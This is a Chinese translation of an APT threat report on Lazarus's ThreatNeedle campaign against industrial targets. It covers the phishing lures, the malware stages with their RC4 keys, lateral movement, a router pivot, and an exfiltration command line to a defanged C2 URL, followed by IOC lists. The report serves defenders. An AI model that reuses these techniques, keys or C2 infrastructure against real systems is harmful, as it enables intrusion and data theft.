# 原创
：  [译] APT分析报告：10.Lazarus以ThreatNeedle家族攻击工业事件还原（BMP图片隐藏RAT）

# [译] APT分析报告：10.Lazarus以ThreatNeedle家族攻击工业事件还原（BMP图片隐藏RAT）

<mark>这是作者新开的一个专栏，主要翻译国外知名安全厂商的APT报告，了解它们的安全技术，学习它们溯源APT组织和恶意代码分析的方法，希望对您有所帮助。当然，由于作者英语有限，会借助机翻进行校验，还请包涵！前文分享了伊朗威胁组织APT34（又名“OilRig”）发起的一项新攻击行动，使用了一种新的后门变体，称之为“SideTwist”。这篇文章将详细讲解卡巴斯基分析Lazarus攻击工业事件，主要采用ThreatNeedle高级恶意软件集群。在这次活动中，Lazarus组织展示了其先进的水平和能力来规避攻击过程中面临的安全措施，例如网络分段。</mark>

#### 文章目录

---


## 一.前言

我们将拉撒路（Lazarus）评为2020年最活跃的APT组织。我们已经观察到这个臭名昭著的APT组织针对各种行业的大量活动。该组织的主要目标也发生了变化。Google TAG最近发表了一篇文章关于Lazarus针对安全研究人员的攻击行动。经过仔细研究，我们发现这些攻击中使用的恶意软件属于我们称为 <mark>ThreatNeedle</mark> 的家族。

我们之前已经看到Lazarus使用该恶意软件集群攻击各个行业。在2020年中期，我们意识到Lazarus正在使用ThreatNeedle集群对GF工业发起攻击，ThreatNeedle集群是Manuscrypt（又名NukeSped）的高级恶意软件集群。在调查该攻击时，我们能够观察到攻击的整个生命周期，发现更多技术细节以及该组织其他攻击事件的关联。

该组织在鱼叉式网络钓鱼电子邮件中使用了<mark>COVID-19主题</mark>，并使用公开来源收集的个人信息来<mark>美化邮件</mark>。在获得最初立足点之后，攻击者收集了凭证并<mark>横向移动</mark>，在受害者环境中寻找关键资产。我们观察了他们如何<mark>通过访问内部路由器并将其配置为代理服务器来克服网络的分割，从而实现从内部网络窃取数据并传输到其远程服务器</mark>。到目前为止，已经有十几个国家的组织受到了影响。

在这次调查中，我们有机会了解命令和控制的基础结构。攻击者在不同阶段配置了多个C2服务器，并重用了该组织先前攻击中的几个脚本。此外，根据目前为止的分析，有可能找出与Lazarus相关的其他攻击关联事件。

---


## 二.最新补充：BMP图片隐藏RAT恶意样本

在介绍此次攻击事件之前，我们先来补充Lazarus最新的攻击技术，即使用BMP图像隐藏RAT恶意软件。

**近日，一名朝鲜黑客对其南方发动了一场鱼叉式网络钓鱼攻击，该黑客将恶意代码隐藏在位图(. bmp)图像文件中，从而投放了一个能够窃取敏感信息的远程木马(RAT)。**

来自Malwarebytes的研究人员将此次攻击归因于Lazarus组织，原因是该组织与对手之前采用的策略相似。他们表示，网络钓鱼活动始于散布带有恶意文件的电子邮件，该公司在4月13日发现了该文件。

<mark>Malwarebytes研究人员说： “攻击者使用了一种聪明的方法来绕过安全机制，在该机制中，它将其恶意HTA文件作为压缩的zlib文件嵌入到PNG文件中，然后在运行时通过将其自身转换为BMP格式进行了解压缩。” 。</mark>

> 
个人疑问



投放的有效载荷（payload）是一个装载机，它将第二阶段的有效载荷解码并解密到内存中。第二阶段的有效载荷具有接收和执行命令或shellcode的能力，它还可以执行撤离以及与控制服务器的通信能力。

引诱文件（韩文）创建于2021年3月31日，据称是韩国某个城市交易会的参与申请表，并在首次打开时提示启用宏，只有执行攻击代码才能触发感染链，最终删除了一个名为“ AppStore.exe”的可执行文件。

此外，该有效载荷将继续提取附加到自身第二阶段的加密有效负载，并在运行时对其进行解码和解密，然后与远程服务器建立通信以接收命令，并将这些命令的结果传输回服务器。

总之，Lazarus作为朝鲜最活跃、最复杂的威胁组织之一，在过去的几年中，它已瞄准了包括韩国、日本在内的多个国家。众所周知，Lazarus在操作中采用了新的技术和自定义工具集，从而提高攻击的效率。

---


## 三.初次感染

**言归正传，回到工业攻击事件。**

在这次攻击中，鱼叉式网络钓鱼被作为最初的感染媒介。在发动攻击之前，该组织研究了有关目标组织的公开信息，并确定了属于该公司各个部门的电子邮件地址。

这些部门中的电子邮件地址收到网络钓鱼电子邮件要么带有恶意的Word文档，要么带有远程服务器上托管的恶意Word文档的链接。网络钓鱼电子邮件声称对当今最热门的主题——COVID-19具有紧急的更新。这些钓鱼邮件是代表受攻击组织的一个医疗中心精心制作和编写的。

攻击者在一个公共电子邮件服务上注册了账户，确保发件人的电子邮件地址与医疗中心的真实电子邮件地址相似。钓鱼邮件中显示的签名包括被攻击组织医疗中心副主任医生的实际个人数据。攻击者能够在该医疗中心的公共网站上找到这些信息。

微软Word文档中的一个宏包含恶意代码，旨在下载并在受感染的系统上执行额外的恶意软件。该文件包含人口健康评估计划的信息，与网络钓鱼邮件(COVID-19)的主题没有直接关系，这表明攻击者可能没有完全理解他们所使用内容的含义。

诱饵文件的内容是从一个健康诊所的在线帖子中复制的。我们的调查显示，最初的鱼叉式网络钓鱼尝试是不成功的，因为在目标系统的Microsoft Office安装中禁用了宏。**为了说服目标允许恶意宏，攻击者发送了另一封电子邮件，展示如何在Microsoft Office中启用宏。**

在发送了上述解释的电子邮件后，攻击者意识到目标使用的是不同版本的Microsoft Office，因此需要不同的过程来启用宏。**随后，攻击者又发了一封电子邮件，在一张截图中显示了正确的操作步骤，并附上了一个俄语包。**

2020年5月21日至26日，攻击者发送的鱼叉式网络钓鱼邮件内容中没有任何语法错误。然而，在随后的邮件中，攻击者犯了许多错误，这表明他们的母语可能不是俄语，并使用了翻译工具。

2020年6月3日，员工打开了一个恶意附件，在当地时间上午9:30，攻击者获得了受感染系统的远程控制。

该组织还使用了不同类型的鱼叉式网络钓鱼攻击。其中一个被攻击的主机在2020年5月19日收到了几份鱼叉式网络钓鱼文件。发送的名为 `Boeing_AERO_GS.docx` 的恶意文件从远程服务器获取模板。

但是，无法发现此恶意文档创建的有效负载。我们推测，这个恶意文件的感染失败了，原因我们不知道。几天后，同一台主机打开了另一个恶意文档。威胁者在最初感染后从磁盘中删除了这些文件，这意味着它们无法获得。

尽管如此，根据我们的遥测技术我们找到了一份带有这种恶意软件的相关恶意文件。它创建一个有效负载和快捷文件，然后使用以下命令行参数继续执行有效负载。

诱饵文件的内容描述了发电机/电力工业工程师的职位描述。

---


## 四.恶意软件植入

在打开恶意文档并允许该宏时，恶意软件将被删除，并进入一个多阶段部署过程。这次行动中使用的恶意软件属于一个已知的恶意软件集群，我们称之为“ThreatNeedle”。我们将这个恶意软件家族归咎于高级版本的Manuscrypt（又名NukeSped），一个属于Lazarus集团的家族。

我们之前观察到Lazarus组织利用这个集群攻击加密货币业务和一家移动游戏公司。虽然恶意软件涉及和整个感染过程是已知的，并且与以前的发现相比并没有发生太大变化，但Lazarus组织继续使用的ThreatNeedle意软件侵略性的活动。

初始鱼叉式钓鱼文档创建的有效负载将加载下一阶段，作为在内存中运行的后门——ThreatNeedle后门。ThreatNeedle提供了控制受感染受害者的功能。参与者使用它进行最初的侦察，并为横向移动部署额外的恶意软件。

当横向移动时，参与者在过程中使用ThreatNeedle安装程序类型的恶意软件。这个安装程序负责植入下一阶段加载程序类型的恶意软件，并对其进行注册以进行自动执行，从而实现持久性。ThreatNeedle加载器类型的恶意软件存在多种变体，其主要目的是在内存中加载ThreatNeedle恶意软件的最后阶段。

### 1.ThreatNeedle安装程序（installer）

一旦启动，恶意软件使用RC4解密嵌入字符串（密钥:B6 B7 2D 8C 6B 5F 14 DF B1 38 A1 73 89 C1 D2 C4），并将其与“7486513879852”进行比较。如果用户在没有命令行参数的情况下执行这个恶意软件，恶意软件就会启动一个合法的计算器，上面带有受欢迎的复仇者联盟的黑暗图标。

<mark>在感染过程中，恶意软件随机从netsvc中选择一个服务名称，以便将其用于有效载荷创建路径</mark>。然后，恶意软件在系统文件夹中创建一个名为 `bcdbootinfo.tlp` 的文件，其中包含感染时间和所选的随机服务名称。我们发现，恶意软件操作人员会检查这个文件，以查看远程主机是否被感染，以及感染发送的时间。

然后，它使用RC4算法解密嵌入的有效载荷，将其保存为.xml扩展名，并在当前目录中随机创建5个字符的文件名，再将其复制到system文件夹中，并使用.sys扩展名。

最后一个有效载荷是在内存中运行的ThreatNeedle加载程序。此时，加载器使用不同的RC4密钥（3D 68 D0 0A B1 0E C6 AF DD EE 18 8E F4 A1 D6 20），被删除的恶意软件注册为Windows服务并启动。此外，该恶意软件还会将配置数据另存为在RC4中加密的注册表项：

---


### 2.ThreatNeedle加载器（loader）

该组件负责将最终的后门有效负载加载到内存中。为了做到这一点，恶意软件使用几种技术来解密其有效载荷：

大多数加载程序类型的恶意软件都会检查命令行参数，并且只有在给出预期参数时才继续执行恶意程序。这是ThreatNeedle加载程序中的一个常见特性。我们见过的最常见的示例类似于ThreatNeedle安装程序，即恶意软件使用RC4解密嵌入的字符串，并在启动时将其与参数“Sx6BrUk4v4rqBFBV”进行比较。如果匹配，恶意软件就开始使用相同的RC4密钥解密嵌入的有效载荷。解密后的有效载荷是一个归档文件，随后在处理过程中解压缩。最终，恶意软件ThreatNeedle会在内存中生成。

加载器的另一个变种正在准备受害者注册表中下一阶段的有效载荷。正如我们从安装程序恶意软件描述中看到的，我们怀疑注册表项是安装程序组件创建的。从注册表检索到的数据使用RC4解密，然后解压缩。最后，它被加载到内存中，并被调用导出函数。

---


### 3.ThreatNeedle后门（backdoor）

在内存中执行的最终有效载荷是实际的ThreatNeedle后门。它具有以下功能来控制受感染的受害者计算机：

---


## 五.Post-exploitation阶段

在其中一台主机上，我们发现参与者执行了一个名为Responder的证书收集工具，并使用Windows命令横向移动。Lazarus克服了网络分段问题，通过破坏路由器虚拟机，从与互联网断开的完全隔离的网络分段中窃取数据，如下文“克服网络分段”中所述。

从攻击后感染了ThreatNeedle后门的主机来判断，我们推测此次攻击的主要目的是窃取知识产权。最后，使用自定义工具对窃取的数据进行窃听，这将在“渗透”部分中进行描述。以下是我们调查的大致时间表。

### 1.凭证收集

在调查过程中，我们发现响应程序工具是从收到鱼叉式网络钓鱼文件的一台受害者计算机执行的。初始感染的一天后，恶意软件操作员将该工具放置到该主机上，并使用以下命令执行该工具：

几天后，攻击者开始从该主机横向移动。因此，我们评估攻击者已成功从该主机获取登录凭据，并开始将其用于进一步的恶意活动。

---


### 2.横向移动

在获得登录凭据之后，参与者开始从工作站横向移动到服务器主机。采用典型的横向移动方法，使用Windows命令。**首先，使用“net use”命令建立与远程主机的网络连接。**

接下来，攻击者使用Windows管理规范命令行（WMIC）将恶意软件复制到远程主机。

---


### 3.克服网络分段

在这项研究过程中，我们确定了另一种高度有趣的技术，由攻击者用于横向移动和泄漏窃取的数据。受到攻击的企业网络分为两个部分:corporate(计算机可以访问internet的网络)和restricted(计算机承载敏感数据但不能访问internet的网络)。根据公司政策，这两个部门之间不允许传递信息。换句话说，这两个部分应该完全分开。

在这项研究过程中，我们发现了攻击者用于横向移动和窃取被窃取数据的另一种非常有趣的技术。受攻击的企业网络分为两个部分：

根据公司政策，这两个部分之间不允许信息传递。换句话说，这两个部分是要完全分开的。

最初，攻击者能够访问具有Internet访问权限的系统，并花费了很长时间在网络企业部门的计算机之间分发恶意软件。在受感染计算机中，有企业IT基础架构管理员使用的计算机。

值得注意的是，管理员可以同时连接到公司网段和受限制的网段，以维护系统并在两个区域中为用户提供技术支持。<font color="red">**因此，通过获得管理员工作站的控制权，攻击者就能访问受限制的网段。**</font>

但是，由于无法在网段之间直接路由流量，因此攻击者无法使用其标准恶意软件集将数据从受限网段泄漏到C2中。

**这种情况在7月2日发生了变化，攻击者设法获得了管理员用来连接到两个网段中系统的路由器的凭据。路由器是一台运行CentOS的虚拟机，可根据预定义的规则在多个网络接口之间路由流量。**

根据收集的证据，攻击者扫描了路由器的端口并检测到Webmin界面。接下来，攻击者使用root特权帐户登录Web界面。目前还不清楚攻击者如何获得该帐户的凭据，但是凭据可能保存在受感染系统的浏览器密码管理器之一中。

通过访问配置面板，攻击者配置了Apache Web服务器，并开始将路由器用作组织的公司部门和受限部门之间的代理服务器。

此后几天，也就是2020年7月10日，攻击者通过SSH连接到路由器，并在其中一台被感染的计算机上安装了PuTTy PSCP（PuTTY安全复制客户端）实用程序。该程序用于将恶意软件上传到路由器虚拟机。这使攻击者可以使用路由器托管样本，将恶意软件放置在企业网络受限网段的系统上。此外，在网络受限网段中运行的恶意软件还可以通过在同一路由器上设置的Apache服务器将收集到的数据泄露到命令和控制服务器。

在调查过程中，我们使用路由器的硬编码URL（用作代理服务器）识别了恶意软件样本。

由于攻击者会定期从路由器删除日志文件，因此只能恢复通过SSH输入到命令行的少数命令。对这些命令的分析表明，攻击者试图使用route命令重新配置流量路由。

**攻击者还在路由器虚拟机VM上运行nmap程序，并在企业网络受限网段内的系统上扫描端口。9月27日，攻击者开始使用logrotate程序来设置自动删除日志文件的功能，并从路由器中删除其活动的所有痕迹。**

---


### 4.Exfiltration 渗出

我们观察到，恶意软件操作员试图从数个受损的服务器主机创建到位于韩国的远程服务器的SSH隧道。他们使用了自定义的隧道工具来实现这一目标。该工具接收四个参数：

该工具提供基本功能，可将客户端流量转发到服务器。为了创建隐蔽通道，恶意软件使用简单的二进制加密对转发的流量进行加密。

利用隐蔽渠道，攻击者使用PuTTy PSCP工具将数据从远程服务器复制到主机：

从服务器复制数据后，攻击者使用定制工具将窃取的数据泄漏到远程服务器。该恶意软件看起来像是合法的VNC客户端，如果在没有任何命令行参数的情况下执行，则会像一个VNC客户端一样运行。

但是，如果使用特定的命令行参数执行此应用程序，则会运行其他恶意功能。根据我们观察的数据，攻击者使用六个参数执行了此应用程序：

```
%APPDATA%\Comms\Comms.dat S0RMM-50QQE-F65DN-DCPYN-5QEQA 
hxxps://www.gonnelli[.]it/uploads/catalogo/thumbs/thumb[.]asp 
%APPDATA%\Comms\cab59.tmp FL0509 15000

```

此外，如果命令行参数的数量大于6个，则恶意软件会跳入恶意程序中。恶意软件还会检查第二个参数的长度，如果它少于29个字符，它将终止执行。参数检查过程成功通过后，恶意软件将开始解密其下一个有效载荷。

嵌入式有效载荷通过XOR解密，其中有效载荷末尾的每个字节都应用于前一个字节。接下来，XORed Blob接收提供的第二个命令行参数（在本例中为S0RMM-50QQE-F65DN-DCPYN-5QEQA）。该恶意软件可以接受更多命令行参数，并且根据其数量，其运行方式也有所不同。例如，还可以使用 “-p” 选项接收代理服务器地址。

当执行解密的内存有效载荷时，它会将传递的配置数据的标头与字符串“ 0x8406”进行比较，以确认其有效性。有效负载将打开给定文件（在本示例中为％APPDATA％ \ Comms \ cab59.tmp），并开始将其分发到远程服务器。当恶意软件将数据上传到C2服务器时，它使用HTTP POST请求，并带有两个名为’fr’和’fp’的参数：

---


## 六.溯源

我们已经跟踪ThreatNeedle恶意软件已有两年多了，并且高度确信此恶意软件群集仅归因于Lazarus组织。在此调查过程中，我们能够找到与Lazarus组织相关的几个集群的联系。

### 1.与DeathNote集群连接

在此调查过程中，我们确定了与Lazarus组织的DeathNote（又名Operation Dream Job）集群的几种联系。

尽管DeathNote和此事件显示了不同的TTP，但这两个攻击共享命令和控制基础结构以及某些受害者。

---


### 2.与AppleJeus行动的联系

我们还发现了与Operation AppleJeus的联系。

---


### 3.与Bookcode集群的连接

在之前有关Lazarus组的博客中，我们提到了归因于Lazarus组的Bookcode集群。最近，韩国互联网aq局（KISA）也发布了有关此操作的报告。

---


## 七.结论

近年来，拉撒路（Lazarus）组织专注于攻击世界各地的金融机构。但是，从2020年初开始，他们专注于积极进攻GF工业。尽管Lazarus以前还曾在针对加密货币企业时利用了此攻击中使用的ThreatNeedle恶意软件，但目前正在积极地用于网络攻击。

这项调查使我们能够在Lazarus进行的多个运动之间建立牢固的联系，从而加强了我们的归属感。**在这次活动中，Lazarus小组展示了其先进的水平和能力来规避他们在攻击过程中面临的安全措施，例如网络分段**。我们估计拉撒路是一个多产的群体，使用不同的策略开展了几次运动。他们在这些运动中共享工具和基础设施以实现其目标。

> 
最后，感谢卡巴斯基ICS CERT，以及本文的作者Vasily Berdnikov（卡巴斯基目标攻击研究小组）的帮助。他们的分析报告是真的精彩，值得我们学习。


---


**前文分享：**

<font color="red">**2020年8月18新开的“娜璋AI安全之家”，主要围绕Python大数据分析、网络空间安全、逆向分析、APT分析报告、人工智能、Web渗透及攻防技术进行讲解，同时分享CCF、SCI、南核北核论文的算法实现。娜璋之家会更加系统，并重构作者的所有文章，从零讲解Python和安全，写了近十年文章，真心想把自己所学所感所做分享出来，还请各位多多指教，真诚邀请您的关注！谢谢。**</font>

(By:Eastmount 2021-04-21 星期三 晚上10点写于武汉 [http://blog.csdn.net/eastmount/](http://blog.csdn.net/eastmount/) )

---


### 附录I 危害指标

**恶意文件**

```
e7aa0237fc3db67a96ebd877806a2c88	Boeing_AERO_GS.docx

```

**安装程序**

```
b191cc4d73a247afe0a62a8c38dc9137	%APPDATA%\Microsoft\DRM\logon.bin
9e440e231ef2c62c78147169a26a1bd3	C:\ProgramData\ntnser.bin
b7cc295767c1d8c6c68b1bb6c4b4214f	C:\ProgramData\ntnser.bin
0f967343e50500494cf3481ce4de698c	C:\ProgramData\Microsoft\MSDN\msdn.bin
09aa1427f26e7dd48955f09a9c604564	%APPDATA\Microsoft\info.dat
07b22533d08f32d48485a521dbc1974d	C:\ProgramData\adobe\load.dat
1c5e4d60a1041cf2903817a31c1fa212	C:\ProgramData\Adobe\adobe.tmp
4cebc83229a40c25434c51ee3d6be13e	C:\ProgramData\Adobe\up.tmp
23b04b18c75aa7d286fea5d28d41a830	%APPDATA%\Microsoft\DRM\logon.dat
319ace20f6ffd39b7fff1444f73c9f5d	%APPDATA%\Microsoft\DRM\logon.bin
45c0a6e13cad26c69eff59fded88ef36	%APPDATA%\Microsoft\DRM\logon.dat
486f25db5ca980ef4a7f6dfbf9e2a1ad	C:\ProgramData\ntusers.dat
1333967486d3ab50d768fb745dae9af5	C:\PerfLogs\log.bin
07b22533d08f32d48485a521dbc1974d	C:\ProgramData\Adobe\load.dat
c86d0a2fa9c4ef59aa09e2435b4ab70c	%TEMP%\ETS4659.tmp
69d71f06fbfe177fb1a5f57b9c3ae587	%APPDATA%\Microsoft\Windows\shsvcs.db
7bad67dcaf269f9ee18869e5ef6b2dc1	 
956e5138940a4f44d1c2c24f122966bd	%APPDATA%\ntuser.bin

```

**加载器**

```
ed627b7bbf7ea78c343e9fb99783c62b	 
1a17609b7df20dcb3bd1b71b7cb3c674	%ALLUSERSPROFILE%\ntuser.bin
fa9635b479a79a3e3fba3d9e65b842c3	 
3758bda17b20010ff864575b0ccd9e50	%SYSTEMROOT%\system\mraudio.drv
cbcf15e272c422b029fcf1b82709e333	%SYSTEMROOT%\system\mraudio.drv
9cb513684f1024bea912e539e482473a	 
36ab0902797bd18acd6880040369731c	%SYSTEMROOT%\LogonHours.sys
db35391857bcf7b0fa17dbbed97ad269	%ALLUSERSPROFILE%\Adobe\update.tmp
be4c927f636d2ae88a1e0786551bf3c4	%ALLUSERSPROFILE%\Adobe\unpack.tmp
728948c66582858f6a3d3136c7fbe84a	%APPDATA%\Microsoft\IBM.DAT
06af39b9954dfe9ac5e4ec397a3003fb	 
29c5eb3f17273383782c716754a3025a	 
79d58b6e850647024fea1c53e997a3f6	 
e604185ee40264da4b7d10fdb6c7ab5e	 
2a73d232334e9956d5b712cc74e01753	 
1a17609b7df20dcb3bd1b71b7cb3c674	%ALLUSERSPROFILE%\ntuser.bin
459be1d21a026d5ac3580888c8239b07	%ALLUSERSPROFILE%\ntuser.bin
87fb7be83eff9bea0d6cc95d68865564	%SYSTEMROOT%\SysWOW64\wmdmpmsp.sys
062a40e74f8033138d19aa94f0d0ed6e	%APPDATA%\microsoft\OutIook.db
9b17f0db7aeff5d479eaee8056b9ac09	%TEMP%\ETS4658.tmp, %APPDATA%\Temp\BTM0345.tmp
9b17f0db7aeff5d479eaee8056b9ac09	%APPDATA%\Temp\BTM0345.tmp
420d91db69b83ac9ca3be23f6b3a620b	 
238e31b562418c236ed1a0445016117c	%APPDATA%\Microsoft\Windows\lconcaches.db, %TEMP%\cache.db
36ab0902797bd18acd6880040369731c	 
238e31b562418c236ed1a0445016117c	%TEMP%\cache.db, %APPDATA%\Microsoft\Windows\lconcaches.db
ad1a93d6e6b8a4f6956186c213494d17	%APPDATA%\Microsoft\Windows\shsvcs.db
c34d5d2cc857b6ee9038d8bb107800f1	  

```

**注册表加载器**

```
16824dfd4a380699f3841a6fa7e52c6d	 
aa74ed16b0057b31c835a5ef8a105942	 
85621411e4c80897c588b5df53d26270	%SYSTEMROOT%\system\avimovie.dll
a611d023dfdd7ca1fab07f976d2b6629	 
160d0e396bf8ec87930a5df46469a960	%WINDIR%\winhelp.dll
110e1c46fd9a39a1c86292487994e5bd	 

```

**下载器**

```
ac86d95e959452d189e30fa6ded05069	%APPDATA%\Microsoft\thumbnails.db

```

**木马VNC上传器**

```
bea90d0ef40a657cb291d25c4573768d	%ALLUSERSPROFILE%\adobe\arm86.dat
254a7a0c1db2bea788ca826f4b5bf51a	%APPDATA%\PBL\user.tmp, %APPDATA%\Comms\Comms.dat

```

**隧道工具**

```
6f0c7cbd57439e391c93a2101f958ccd	%APPDATA\PBL\update.tmp
fc9e7dc13ce7edc590ef7dfce12fe017	

```

**LPE客户端**

```
0aceeb2d38fe8b5ef2899dd6b80bfc08	%TEMP%\ETS5659.tmp
09580ea6f1fe941f1984b4e1e442e0a5	%TEMP%\ETS4658.tmp

```

**文件路径**

```
%SYSTEMROOT%\system32\bcdbootinfo.tlp
%SYSTEMROOT%\system32\Nwsapagent.sys
%SYSTEMROOT%\system32\SRService.sys
%SYSTEMROOT%\system32\NWCWorkstation.sys
%SYSTEMROOT%\system32\WmdmPmSp.sys
%SYSTEMROOT%\system32\PCAudit.sys
%SYSTEMROOT%\system32\helpsvc.sys

```

**注册表路径**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\GameConfig – Description
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\KernelConfig – SubVersion

```

**域和IP**

```
hxxp://forum.iron-maiden[.]ru/core/cache/index[.]php
hxxp://www.au-pair[.]org/admin/Newspaper[.]asp
hxxp://www.au-pair[.]org/admin/login[.]asp
hxxp://www.colasprint[.]com/_vti_log/upload[.]asp
hxxp://www.djasw.or[.]kr/sub/popup/images/upfiles[.]asp
hxxp://www.kwwa[.]org/popup/160307/popup_160308[.]asp
hxxp://www.kwwa[.]org/DR6001/FN6006LS[.]asp
hxxp://www.sanatoliacare[.]com/include/index[.]asp
hxxps://americanhotboats[.]com/forums/core/cache/index[.]php
hxxps://docentfx[.]com/wp-admin/includes/upload[.]php
hxxps://kannadagrahakarakoota[.]org/forums/admincp/upload[.]php
hxxps://polyboatowners[.]com/2010/images/BOTM/upload[.]php
hxxps://ryanmcbain[.]com/forum/core/cache/upload[.]php
hxxps://shinwonbook.co[.]kr/basket/pay/open[.]asp
hxxps://shinwonbook.co[.]kr/board/editor/upload[.]asp
hxxps://theforceawakenstoys[.]com/vBulletin/core/cache/upload[.]php
hxxps://www.automercado.co[.]cr/empleo/css/main[.]jsp
hxxps://www.curiofirenze[.]com/include/inc-site[.]asp
hxxps://www.digitaldowns[.]us/artman/exec/upload[.]php
hxxps://www.digitaldowns[.]us/artman/exec/upload[.]php
hxxps://www.dronerc[.]it/forum/uploads/index[.]php
hxxps://www.dronerc[.]it/shop_testbr/Adapter/Adapter_Config[.]php
hxxps://www.edujikim[.]com/intro/blue/view[.]asp
hxxps://www.edujikim[.]com/pay/sample/INIstart[.]asp
hxxps://www.edujikim[.]com/smarteditor/img/upload[.]asp
hxxps://www.fabioluciani[.]com/ae/include/constant[.]asp
hxxps://www.fabioluciani[.]com/es/include/include[.]asp
hxxp://www.juvillage.co[.]kr/img/upload[.]asp
hxxps://www.lyzeum[.]com/board/bbs/bbs_read[.]asp
hxxps://www.lyzeum[.]com/images/board/upload[.]asp
hxxps://martiancartel[.]com/forum/customavatars/avatars[.]php
hxxps://www.polyboatowners[.]com/css/index[.]php
hxxps://www.sanlorenzoyacht[.]com/newsl/include/inc-map[.]asp
hxxps://www.raiestatesandbuilders[.]com/admin/installer/installer/index[.]php
hxxp://156.245.16[.]55/admin/admin[.]asp
hxxp://fredrikarnell[.]com/marocko2014/index[.]php
hxxp://roit.co[.]kr/xyz/mainpage/view[.]asp

```

**第二阶段C2地址**

```
hxxps://www.waterdoblog[.]com/uploads/index[.]asp
hxxp://www.kbcwainwrightchallenge.org[.]uk/connections/dbconn[.]asp

```

**C2 URL用于提取特洛伊木马VNC上传器使用的文件**

```
hxxps://prototypetrains[.]com:443/forums/core/cache/index[.]php
hxxps://newidealupvc[.]com:443/img/prettyPhoto/jquery.max[.]php
hxxps://mdim.in[.]ua:443/core/cache/index[.]php
hxxps://forum.snowreport[.]gr:443/cache/template/upload[.]php
hxxps://www.gonnelli[.]it/uploads/catalogo/thumbs/thumb[.]asp
hxxps://www.dellarocca[.]net/it/content/img/img[.]asp
hxxps://www.astedams[.]it/photos/image/image[.]asp
hxxps://www.geeks-board[.]com/blog/wp-content/uploads/2017/cache[.]php
hxxps://cloudarray[.]com/images/logo/videos/cache[.]jsp

```

---


### 附录II MITER ATT＆CK映射
